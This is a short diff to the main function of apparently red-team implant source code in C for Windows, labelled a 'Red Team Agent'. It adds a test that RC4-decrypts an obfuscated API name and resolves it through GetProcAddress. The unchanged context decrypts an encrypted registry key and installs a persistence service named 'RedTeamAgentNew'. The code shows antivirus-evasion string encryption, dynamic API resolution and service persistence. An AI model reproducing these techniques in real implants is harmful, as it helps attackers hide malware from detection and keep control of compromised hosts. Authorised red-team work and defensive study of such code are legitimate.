@@ -36,6 +36,17 @@ int main(int argc, char* argv[])
 {   
     char Filename[MAX_PATH] = { 0 };
     DWORD nLength = GetModuleFileName(NULL, Filename, MAX_PATH) + 1;
+
+
+
+    const char* MessageBoxEncrypted = "\xd6\xc0\xb1\xeb\xd4\x8e\x41\x8c\x96\x0b\x92";
+    int Length = strlen(MessageBoxEncrypted);
+
+
+    HMODULE User32DLL = LoadLibraryA("User32.dll");
+    MessageBoxAPI = (MSGBOXDEF)GetProcAddress(User32DLL, (char*)RC4((char*)"RedTeam", (unsigned char*) MessageBoxEncrypted, Length));
+    (*MessageBoxAPI)(0, "This is my Red Team Agent","Red Team", 0);
+    return 0;
     
     const char* EncryptedRegKey = "\x97\x8b\x82\x90\x93\x85\x96\x81\x98\x89\xad\xa7\xb6\xab\xb7\xab\xa2\xb0\x98\x93\xad\xaa\xa0\xab\xb3\xb7\x98\x87\xb1\xb6\xb6\xa1\xaa\xb0\x92\xa1\xb6\xb7\xad\xab\xaa\x98\x96\xb1\xaa";
     char* DecryptedRegKey = (char*)RC4((char*)"RedTeam", (unsigned char*)EncryptedRegKey, strlen(EncryptedRegKey));
@@ -61,6 +72,8 @@ int main(int argc, char* argv[])
         InstallService((char*)"RedTeamAgentNew");
 
     }
+
+
 
 
 
